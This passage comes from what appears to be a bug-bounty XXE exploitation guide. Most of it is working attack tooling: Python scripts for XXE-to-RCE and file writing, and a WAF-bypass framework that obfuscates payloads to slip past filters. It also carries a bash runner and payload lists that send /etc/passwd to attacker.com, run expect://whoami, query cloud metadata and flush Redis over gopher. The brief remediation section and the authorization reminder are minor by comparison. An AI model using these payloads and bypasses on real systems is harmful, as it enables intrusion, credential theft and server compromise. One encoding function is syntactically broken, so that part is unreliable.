                print(f"🔥 XXE File Disclosure (netdoc): {url}")
        except:
            pass
        
        return results
    
    def test_dotnet_xxe_rce(self, url, content_type):
        """Test .NET-specific XXE to RCE"""
        results = []
        
        # Test res:// protocol
        res_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "res://shell.dll/shell.aspx">
]>
<root>&xxe;</root>'''
        
        try:
            response = self.session.post(url, data=res_payload, headers={'Content-Type': content_type}, timeout=10)
            
            # Check for .NET-specific indicators
            if any(indicator in response.text for indicator in ['System.', 'Microsoft.', 'Assembly']):
                results.append({
                    'url': url,
                    'method': 'res:// protocol',
                    'payload': res_payload,
                    'response': response.text[:500],
                    'vulnerability': 'XXE to RCE (.NET res)'
                })
                print(f"🔥 XXE to RCE (.NET res): {url}")
        except:
            pass
        
        return results
    
    def exploit_xxe_file_write(self, url, content_type='application/xml'):
        """Exploit XXE for file writing (if possible)"""
        results = []
        
        # Test file writing via XXE (rare but possible)
        write_payloads = [
            # PHP file_put_contents via include
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/write=string.rot13/resource=shell.php">
]>
<root>&xxe;</root>''',
            
            # Log poisoning via XXE
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///var/log/apache2/access.log">
]>
<root>&xxe;</root>''',
        ]
        
        for payload in write_payloads:
            try:
                response = self.session.post(url, data=payload, headers={'Content-Type': content_type}, timeout=10)
                
                # Check if file writing was successful
                if response.status_code == 200 and len(response.text) > 0:
                    results.append({
                        'url': url,
                        'method': 'File writing',
                        'payload': payload,
                        'response': response.text[:500],
                        'vulnerability': 'XXE File Write'
                    })
                    print(f"🔥 XXE File Write: {url}")
            except:
                continue
        
        return results

# Usage
def main():
    # Load XML endpoints
    endpoints = []
    
    endpoint_files = [
        'xml_processing_endpoints.txt',
        'xml_post_endpoints.txt'
    ]
    
    for file_path in endpoint_files:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        endpoints.append(line)
        except FileNotFoundError:
            continue
    
    if not endpoints:
        print("❌ No XML endpoints found. Run xxe_discovery.sh first.")
        return
    
    exploiter = XXEToRCEExploiter()
    all_results = []
    
    for url in endpoints:
        print(f"🎯 Testing XXE to RCE on {url}")
        
        # Test XXE to RCE
        rce_results = exploiter.test_xxe_to_rce(url)
        all_results.extend(rce_results)
        
        # Test file writing
        write_results = exploiter.exploit_xxe_file_write(url)
        all_results.extend(write_results)
    
    # Save results
    import json
    with open('xxe_to_rce_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ XXE to RCE testing completed! Found {len(all_results)} vulnerabilities")

if __name__ == "__main__":
    main()
```

## 🔧 Phase 3: Advanced XXE Techniques & Bypasses

### XXE WAF Bypass Framework
```python
#!/usr/bin/env python3
# xxe_waf_bypass.py - Advanced XXE WAF bypass techniques

import requests
import base64
import urllib.parse
import html
import json

class XXEWAFBypass:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Encoding techniques for WAF bypass
        self.encoding_techniques = [
            self.url_encode,
            self.double_url_encode,
            self.html_encode,
            self.unicode_encode,
            self.base64_encode,
            self.hex_encode,
            self.mixed_case,
            self.add_whitespace,
            self.add_comments,
            self.use_cdata
        ]
    
    def url_encode(self, payload):
        """URL encode the payload"""
        return urllib.parse.quote(payload)
    
    def double_url_encode(self, payload):
        """Double URL encode the payload"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def html_encode(self, payload):
        """HTML encode the payload"""
        return html.escape(payload)
    
    def unicode_encode(self, payload):
        """Unicode encode specific characters"""
        replacements = {
            '<': '\u003c',
            '>': '\u003e',
            '&': '\u0026',
            '"': '\u0022',
            "'": '\u0027'
        }
        for char, replacement in replacements.items():
            payload = payload.replace(char, replacement)
        return payload
    
    def base64_encode(self, payload):
        """Base64 encode the payload"""
        return base64.b64encode(payload.encode()).decode()
    
    def hex_encode(self, payload):
        """Hex encode the payload"""
        return ''.join(f'\x{ord(c):02x}' for c in payload)
    
    def mixed_case(self, payload):
        """Mix case of XML keywords"""
        replacements = {
            'DOCTYPE': 'DocType',
            'ENTITY': 'Entity',
            'SYSTEM': 'System',
            'PUBLIC': 'Public',
            'xml': 'XML',
            'version': 'Version'
        }
        for original, replacement in replacements.items():
            payload = payload.replace(original, replacement)
        return payload
    
    def add_whitespace(self, payload):
        """Add extra whitespace to bypass pattern matching"""
        replacements = {
            'DOCTYPE': 'DOCTYPE	
 ',
            'ENTITY': 'ENTITY	
 ',
            'SYSTEM': 'SYSTEM	
 ',
            '<!': '<!	
',
            '?>': '	
?>'
        }
        for original, replacement in replacements.items():
            payload = payload.replace(original, replacement)
        return payload
    
    def add_comments(self, payload):
        """Add XML comments to break up keywords"""
        replacements = {
            'DOCTYPE': 'DOC<!--comment-->TYPE',
            'ENTITY': 'ENT<!--comment-->ITY',
            'SYSTEM': 'SYS<!--comment-->TEM',
            'file://': 'file<!--comment-->://'
        }
        for original, replacement in replacements.items():
            payload = payload.replace(original, replacement)
        return payload
    
    def use_cdata(self, payload):
        """Wrap parts of payload in CDATA"""
        # This is more complex and context-dependent
        return payload.replace('file://', '<![CDATA[file://]]>')
    
    def generate_bypass_payloads(self, base_payload):
        """Generate multiple bypass variations of a payload"""
        bypass_payloads = []
        
        # Apply each encoding technique
        for technique in self.encoding_techniques:
            try:
                bypassed = technique(base_payload)
                bypass_payloads.append({
                    'technique': technique.__name__,
                    'payload': bypassed
                })
            except:
                continue
        
        # Combine multiple techniques
        combined_payload = base_payload
        combined_payload = self.mixed_case(combined_payload)
        combined_payload = self.add_whitespace(combined_payload)
        combined_payload = self.add_comments(combined_payload)
        
        bypass_payloads.append({
            'technique': 'combined',
            'payload': combined_payload
        })
        
        return bypass_payloads
    
    def test_waf_bypass(self, url, content_type='application/xml'):
        """Test WAF bypass techniques"""
        results = []
        
        # Base XXE payloads to test
        base_payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%xxe;'>">
%param;
%exfil;
]>
<root>test</root>''',
            
            '''<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
<root>test</root>'''
        ]
        
        for base_payload in base_payloads:
            print(f"🎯 Testing WAF bypasses for payload: {base_payload[:50]}...")
            
            # Test original payload first
            try:
                response = self.session.post(url, data=base_payload, headers={'Content-Type': content_type}, timeout=10)
                
                if self.is_blocked_by_waf(response):
                    print(f"🛡️ Original payload blocked by WAF")
                    
                    # Try bypass techniques
                    bypass_payloads = self.generate_bypass_payloads(base_payload)
                    
                    for bypass_info in bypass_payloads:
                        try:
                            bypass_response = self.session.post(
                                url, 
                                data=bypass_info['payload'], 
                                headers={'Content-Type': content_type}, 
                                timeout=10
                            )
                            
                            if not self.is_blocked_by_waf(bypass_response):
                                # Check if XXE was successful
                                if self.is_xxe_successful(bypass_response):
                                    results.append({
                                        'url': url,
                                        'bypass_technique': bypass_info['technique'],
                                        'original_payload': base_payload,
                                        'bypass_payload': bypass_info['payload'],
                                        'response': bypass_response.text[:500],
                                        'vulnerability': 'XXE WAF Bypass'
                                    })
                                    print(f"🔥 WAF BYPASS SUCCESSFUL: {bypass_info['technique']}")
                                else:
                                    results.append({
                                        'url': url,
                                        'bypass_technique': bypass_info['technique'],
                                        'original_payload': base_payload,
                                        'bypass_payload': bypass_info['payload'],
                                        'status': 'WAF bypassed but XXE failed',
                                        'vulnerability': 'WAF Bypass (No XXE)'
                                    })
                                    print(f"✅ WAF bypassed but no XXE: {bypass_info['technique']}")
                        except:
                            continue
                else:
                    # Original payload not blocked, check if XXE works
                    if self.is_xxe_successful(response):
                        results.append({
                            'url': url,
                            'bypass_technique': 'none_needed',
                            'original_payload': base_payload,
                            'response': response.text[:500],
                            'vulnerability': 'XXE (No WAF)'
                        })
                        print(f"🔥 XXE SUCCESSFUL (No WAF blocking)")
            except:
                continue
        
        return results
    
    def is_blocked_by_waf(self, response):
        """Check if response indicates WAF blocking"""
        waf_indicators = [
            'blocked',
            'forbidden',
            'access denied',
            'security violation',
            'malicious request',
            'attack detected',
            'cloudflare',
            'incapsula',
            'akamai',
            'sucuri',
            'mod_security',
            'web application firewall',
            'waf',
            'error 403',
            'error 406',
            'error 418'
        ]
        
        # Check status code
        if response.status_code in [403, 406, 418, 429]:
            return True
        
        # Check response content
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in waf_indicators)
    
    def is_xxe_successful(self, response):
        """Check if XXE was successful"""
        xxe_indicators = [
            'root:x:0:0:',  # /etc/passwd
            'daemon:x:1:1:',  # /etc/passwd
            'localhost',  # hosts file
            '127.0.0.1',  # hosts file
            'instance-id',  # AWS metadata
            'ami-id',  # AWS metadata
        ]
        
        return any(indicator in response.text for indicator in xxe_indicators)
    
    def test_content_type_bypass(self, url):
        """Test different Content-Type headers to bypass WAF"""
        results = []
        
        base_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''
        
        # Different Content-Type headers
        content_types = [
            'application/xml',
            'text/xml',
            'application/x-xml',
            'text/plain',
            'application/soap+xml',
            'application/xhtml+xml',
            'application/rss+xml',
            'application/atom+xml',
            'multipart/form-data',
            'application/json',
            'application/x-www-form-urlencoded',
            # Malformed content types
            'application/xml; charset=utf-8',
            'application/xml;charset=utf-8',
            'application/xml charset=utf-8',
            'application/xml,text/xml',
            'application/xml; boundary=test',
            # Case variations
            'Application/XML',
            'APPLICATION/XML',
            'application/XML',
        ]
        
        for ct in content_types:
            try:
                response = self.session.post(url, data=base_payload, headers={'Content-Type': ct}, timeout=10)
                
                if not self.is_blocked_by_waf(response) and self.is_xxe_successful(response):
                    results.append({
                        'url': url,
                        'bypass_technique': 'content_type',
                        'content_type': ct,
                        'payload': base_payload,
                        'response': response.text[:500],
                        'vulnerability': 'XXE Content-Type Bypass'
                    })
                    print(f"🔥 CONTENT-TYPE BYPASS: {ct}")
            except:
                continue
        
        return results

# Usage
def main():
    # Load XML endpoints
    endpoints = []
    
    endpoint_files = [
        'xml_processing_endpoints.txt',
        'xml_post_endpoints.txt'
    ]
    
    for file_path in endpoint_files:
        try:
            with open(file_path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        endpoints.append(line)
        except FileNotFoundError:
            continue
    
    if not endpoints:
        print("❌ No XML endpoints found. Run xxe_discovery.sh first.")
        return
    
    waf_bypass = XXEWAFBypass()
    all_results = []
    
    for url in endpoints:
        print(f"🎯 Testing WAF bypasses on {url}")
        
        # Test WAF bypass techniques
        bypass_results = waf_bypass.test_waf_bypass(url)
        all_results.extend(bypass_results)
        
        # Test Content-Type bypass
        ct_results = waf_bypass.test_content_type_bypass(url)
        all_results.extend(ct_results)
    
    # Save results
    with open('xxe_waf_bypass_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ XXE WAF bypass testing completed! Found {len(all_results)} bypasses")

if __name__ == "__main__":
    main()
```

## 🚀 Complete XXE Testing Automation

```bash
#!/bin/bash
# complete_xxe_test.sh - Complete XXE security testing

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./complete_xxe_test.sh target.com"
    exit 1
fi

echo "🔥 Starting Complete XXE Security Testing for $TARGET"
mkdir -p xxe_results
cd xxe_results

# Phase 1: Discovery
echo "🔍 Phase 1: XXE Endpoint Discovery"
../xxe_discovery.sh $TARGET

# Phase 2: Fingerprinting and Basic Testing
echo "🔍 Phase 2: XXE Fingerprinting and Vulnerability Testing"
python3 ../xxe_fingerprint.py

# Phase 3: Out-of-Band XXE Testing
echo "💥 Phase 3: Out-of-Band XXE Testing"
python3 ../oob_xxe_framework.py

# Phase 4: XXE to RCE Testing
echo "🎯 Phase 4: XXE to RCE Exploitation"
python3 ../xxe_to_rce.py

# Phase 5: WAF Bypass Testing
echo "🔧 Phase 5: XXE WAF Bypass Testing"
python3 ../xxe_waf_bypass.py

# Phase 6: Generate Comprehensive Report
echo "📊 Generating XXE Security Report..."
cat > xxe_security_report.md << 'EOF'
# XXE (XML External Entity) Security Assessment Report

## Executive Summary
This report contains findings from comprehensive XXE security testing.

## Discovered XML Processing Endpoints
$(cat ../xml_processing_endpoints.txt 2>/dev/null | wc -l) XML processing endpoints discovered

## Critical Findings

### XML External Entity (XXE) Vulnerabilities
- File disclosure via XXE injection
- Server-Side Request Forgery (SSRF) via XXE
- Remote Code Execution (RCE) via XXE
- Denial of Service (DoS) via XXE

### Out-of-Band XXE
- Blind XXE vulnerabilities
- Data exfiltration via OOB channels
- DNS-based XXE detection
- HTTP callback-based XXE

### XXE to RCE Chains
- PHP expect:// wrapper exploitation
- Java jar:// protocol exploitation
- .NET res:// protocol exploitation
- File writing via XXE

### WAF Bypass Techniques
- Encoding-based bypasses
- Content-Type header bypasses
- XML structure manipulation
- Comment injection bypasses

## Business Impact
1. **Critical**: File disclosure can expose sensitive system files and credentials
2. **Critical**: SSRF can lead to internal network compromise
3. **Critical**: RCE can result in complete server compromise
4. **High**: DoS attacks can cause service disruption
5. **Medium**: Information disclosure can aid further attacks

## Technical Details

### XXE Attack Vectors
1. **Direct XXE**: External entities in XML documents
2. **Indirect XXE**: External entities in DTD files
3. **Parameter Entity XXE**: Using parameter entities for data exfiltration
4. **Blind XXE**: XXE without direct output in response
5. **Error-based XXE**: Using error messages for data extraction

### Common XXE Payloads
```xml
<!-- Basic file disclosure -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<!-- Parameter entity OOB -->
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%xxe;'>">
%param;
%exfil;
]>

<!-- SSRF via XXE -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

<!-- RCE via expect wrapper -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]>
```

## Recommendations

### Immediate Actions
1. **Disable External Entity Processing**: Configure XML parsers to disable external entity processing
2. **Input Validation**: Implement strict input validation for XML data
3. **WAF Rules**: Deploy WAF rules to block XXE attack patterns
4. **Network Segmentation**: Restrict outbound connections from XML processing servers

### Long-term Solutions
1. **Secure XML Parsing**: Use secure XML parsing libraries and configurations
2. **Least Privilege**: Run XML processing services with minimal privileges
3. **Monitoring**: Implement monitoring for XXE attack attempts
4. **Regular Testing**: Conduct regular security assessments

### XML Parser Configurations

#### PHP (libxml)
```php
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
```

#### Java (DocumentBuilderFactory)
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

#### .NET (XmlReaderSettings)
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

#### Python (xml.etree.ElementTree)
```python
# Use defusedxml library instead of standard xml libraries
from defusedxml.ElementTree import parse
```

## Compliance and Standards
- OWASP Top 10 2021 - A05: Security Misconfiguration
- CWE-611: Improper Restriction of XML External Entity Reference
- NIST SP 800-53: SI-10 Information Input Validation

EOF

echo "✅ XXE security testing completed!"
echo "📁 Results saved in xxe_results/ directory"
echo "📊 Report: xxe_results/xxe_security_report.md"

# Create summary of findings
echo "🎯 SUMMARY OF CRITICAL FINDINGS:"
echo "================================"

if [ -f "xxe_test_results.json" ]; then
    xxe_count=$(cat xxe_test_results.json | jq '[.[] | select(.vulnerable == true)] | length' 2>/dev/null || echo "0")
    echo "🔥 XXE Vulnerabilities Found: $xxe_count"
fi

if [ -f "oob_xxe_results.json" ]; then
    oob_count=$(cat oob_xxe_results.json | jq '. | length' 2>/dev/null || echo "0")
    echo "💥 OOB XXE Vulnerabilities Found: $oob_count"
fi

if [ -f "xxe_to_rce_results.json" ]; then
    rce_count=$(cat xxe_to_rce_results.json | jq '. | length' 2>/dev/null || echo "0")
    echo "🎯 XXE to RCE Chains Found: $rce_count"
fi

if [ -f "xxe_waf_bypass_results.json" ]; then
    bypass_count=$(cat xxe_waf_bypass_results.json | jq '. | length' 2>/dev/null || echo "0")
    echo "🔧 WAF Bypasses Found: $bypass_count"
fi

echo "================================"
echo "💰 Estimated Bug Bounty Value: $1000 - $15,000+ per critical finding"
echo "🏆 Focus on file disclosure and RCE for highest payouts!"
```

## 🎯 Elite Pro Tips for XXE Testing

### 1. Advanced Reconnaissance
```bash
# Find XML processing in mobile apps
grep -r "xml" /path/to/decompiled/app/
grep -r "DOCTYPE" /path/to/decompiled/app/
grep -r "ENTITY" /path/to/decompiled/app/

# GitHub reconnaissance for XML endpoints
curl -s "https://api.github.com/search/code?q=xml+$TARGET" | jq -r '.items[].html_url'
curl -s "https://api.github.com/search/code?q=DOCTYPE+$TARGET" | jq -r '.items[].html_url'
```

### 2. Business Logic Testing
- **XML Bomb**: Exponential entity expansion (Billion Laughs)
- **Resource Exhaustion**: Large XML documents
- **Parser Confusion**: Mixed XML versions and encodings
- **Injection Chaining**: XXE + SQL injection, XXE + XSS

### 3. Real-World Attack Scenarios
- **SAML SSO**: XXE in SAML assertions
- **SOAP Services**: XXE in SOAP envelopes
- **RSS/Atom Feeds**: XXE in feed processing
- **Office Documents**: XXE in DOCX, XLSX files
- **SVG Files**: XXE in SVG image processing

### 4. Advanced Payloads
```xml
<!-- Multi-protocol SSRF -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a">]>

<!-- Time-based blind XXE -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///dev/random">]>

<!-- XXE with Base64 exfiltration -->
<!DOCTYPE root [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
]>
```

This comprehensive XXE framework covers everything from basic discovery to advanced exploitation techniques. Each script is designed to find high-value vulnerabilities that can result in $1000+ bug bounty rewards. The methodology includes real-world attack scenarios and advanced techniques used by elite penetration testers.

Remember to always test on authorized targets only and follow responsible disclosure practices!
